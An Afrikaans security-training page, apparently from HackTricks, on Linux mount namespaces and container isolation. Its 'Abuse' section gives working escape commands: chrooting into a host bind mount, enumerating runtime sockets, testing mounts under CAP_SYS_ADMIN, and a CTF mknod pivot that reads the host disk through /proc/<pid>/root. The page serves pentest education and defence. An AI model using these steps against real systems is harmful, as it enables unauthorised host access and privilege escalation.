# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die mount namespace beheer die **mount table** wat 'n proses sien. Dit is een van die belangrikste container-isolasiekenmerke, omdat die root filesystem, bind mounts, tmpfs mounts, procfs-view, sysfs-blootstelling en baie runtime-spesifieke helper mounts almal deur daardie mount table uitgedruk word. Twee prosesse kan albei toegang tot `/`, `/proc`, `/sys` of `/tmp` hê, maar waarna daardie paaie verwys, hang af van die mount namespace waarin hulle is.

Vanuit 'n container-security-perspektief is die mount namespace dikwels die verskil tussen "dit is 'n netjies voorbereide application filesystem" en "hierdie proses kan die host filesystem direk sien of beïnvloed". Daarom draai bind mounts, `hostPath` volumes, geprivilegieerde mount-operasies en skryfbare `/proc`- of `/sys`-blootstellings almal om hierdie namespace.

## Werking

Wanneer 'n runtime 'n container begin, skep dit gewoonlik 'n nuwe mount namespace, berei dit 'n root filesystem vir die container voor, mount dit procfs en ander helper filesystems soos nodig, en voeg dit dan opsioneel bind mounts, tmpfs mounts, secrets, config maps of host paths by. Sodra die proses binne die namespace loop, is die stel mounts wat dit sien grootliks ontkoppel van die host se verstek-aansig. Die host kan steeds die werklike onderliggende filesystem sien, maar die container sien die weergawe wat die runtime daarvoor saamgestel het.

Dit is kragtig omdat dit die container laat glo dat dit sy eie root filesystem het, selfs al bestuur die host steeds alles. Dit is ook gevaarlik, want as die runtime die verkeerde mount blootstel, kry die proses skielik sigbaarheid in host-hulpbronne waarteen die res van die security model moontlik nie ontwerp is om te beskerm nie.

## Lab

Jy kan 'n private mount namespace skep met:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
As jy ’n ander shell buite daardie namespace oopmaak en die mount table inspekteer, sal jy sien dat die tmpfs mount slegs binne die geïsoleerde mount namespace bestaan. Dit is ’n nuttige oefening omdat dit wys dat mount isolation nie abstrakte teorie is nie; die kernel bied letterlik ’n ander mount table aan die process.

As jy ’n ander shell buite daardie namespace oopmaak en die mount table inspekteer, sal die tmpfs mount slegs binne die geïsoleerde mount namespace bestaan.

Binne containers is ’n vinnige vergelyking:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Die tweede voorbeeld demonstreer hoe maklik 'n runtime configuration 'n enorme gat deur die filesystem-grens kan slaan.

## Runtime Usage

Docker, Podman, containerd-based stacks en CRI-O maak almal staat op 'n private mount namespace vir normale containers. Kubernetes bou bo-op dieselfde meganisme vir volumes, projected secrets, config maps en `hostPath` mounts. Incus/LXC-omgewings maak ook sterk staat op mount namespaces, veral omdat system containers dikwels ryker en meer masjienagtige filesystems blootstel as application containers.

Dit beteken dat wanneer jy 'n container-filesystem-probleem ondersoek, jy gewoonlik nie na 'n geïsoleerde Docker-quirk kyk nie. Jy kyk na 'n mount-namespace- en runtime-configuration-probleem wat uitgedruk word deur watter platform ook al die workload geloods het.

## Misconfigurations

Die mees ooglopende en gevaarlikste fout is om die host se root filesystem of 'n ander sensitiewe host-path deur 'n bind mount bloot te stel, byvoorbeeld `-v /:/host` of 'n writable `hostPath` in Kubernetes. Op daardie punt is die vraag nie meer "kan die container op een of ander manier escape?" nie, maar eerder "hoeveel nuttige host-content is reeds direk sigbaar en writable?" 'n Writable host bind mount verander dikwels die res van die exploit in 'n eenvoudige kwessie van file placement, chrooting, config modification of runtime socket discovery.

'n Ander algemene probleem is om host `/proc` of `/sys` bloot te stel op maniere wat die veiliger container view omseil. Hierdie filesystems is nie gewone data mounts nie; hulle is interfaces na kernel- en process-state. As die workload die host-weergawes direk bereik, hou baie van die aannames agter container hardening op om netjies van toepassing te wees.

Read-only protections is ook belangrik. 'n Read-only root filesystem beveilig nie 'n container op magiese wyse nie, maar dit verwyder 'n groot hoeveelheid attacker staging space en maak persistence, helper-binary placement en config tampering moeiliker. Omgekeerd gee 'n writable root of writable host bind mount 'n attacker ruimte om die volgende stap voor te berei.

## Abuse

Wanneer die mount namespace misbruik word, doen attackers gewoonlik een van vier dinge. Hulle **lees host-data** wat buite die container moes gebly het. Hulle **wysig host-configuration** deur writable bind mounts. Hulle **mount of remount additional resources** as capabilities en seccomp dit toelaat. Of hulle **bereik powerful sockets en runtime state directories** wat hulle in staat stel om die container-platform self vir meer access te vra.

As die container reeds die host-filesystem kan sien, verander die res van die security model onmiddellik.

Wanneer jy 'n host bind mount vermoed, bevestig eers wat beskikbaar is en of dit writable is:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
As die host root filesystem read-write gemount is, is direkte host access dikwels so eenvoudig soos:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
As die doel bevoorregte runtime-toegang eerder as direkte chrooting is, enumereer sockets en runtime-status:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
As `CAP_SYS_ADMIN` teenwoordig is, toets ook of nuwe mounts van binne die container geskep kan word:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Volledige voorbeeld: Twee-Shell `mknod` Pivot

’n Meer gespesialiseerde misbruikroete ontstaan wanneer die container se root user bloktoestelle kan skep, die host en container ’n user identity op ’n nuttige manier deel, en die aanvaller reeds ’n low-privilege foothold op die host het. In daardie situasie kan die container ’n device node soos `/dev/sda` skep, en die low-privilege host user kan dit later deur `/proc/<pid>/root/` lees vir die ooreenstemmende container-proses.<sup>[[1]](#references)</sup>

Binne die container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Vanaf die host, as die ooreenstemmende gebruiker met lae privileges nadat die container shell PID opgespoor is:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Die belangrike les is nie die presiese CTF string search nie. Dit is dat mount-namespace-blootstelling deur `/proc/<pid>/root/` ’n host-gebruiker kan toelaat om toestel nodusse wat deur die container geskep is, te hergebruik, selfs wanneer cgroup-toestelbeleid direkte gebruik binne die container self verhoed het.<sup>[[1]](#references)</sup>

## Kontroles

Hierdie opdragte is daar om jou die lêerstelsel-aansig te wys waarin die huidige proses werklik leef. Die doel is om host-afgeleide mounts, skryfbare sensitiewe paaie en enigiets wat breër lyk as ’n normale application container se root-lêerstelsel raak te sien.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Wat hier interessant is:

- Bind mounts vanaf die host, veral `/`, `/proc`, `/sys`, runtime state directories of socket locations, behoort onmiddellik uit te staan.
- Onverwagte read-write mounts is gewoonlik belangriker as groot getalle read-only helper mounts.
- `mountinfo` is dikwels die beste plek om te sien of ’n path werklik van die host afkomstig is of deur ’n overlay ondersteun word.

Hierdie kontroles bepaal **watter resources in hierdie namespace sigbaar is**, **watter van die host afkomstig is**, en **watter daarvan skryfbaar of sekuriteitsensitief is**.

## Verwysings

- [1] [When Containers Lie: Escaping Root and Breaking Docker Isolation](https://www.kayssel.com/post/docker-security-2/)

{{#include ../../../../../banners/hacktricks-training.md}}
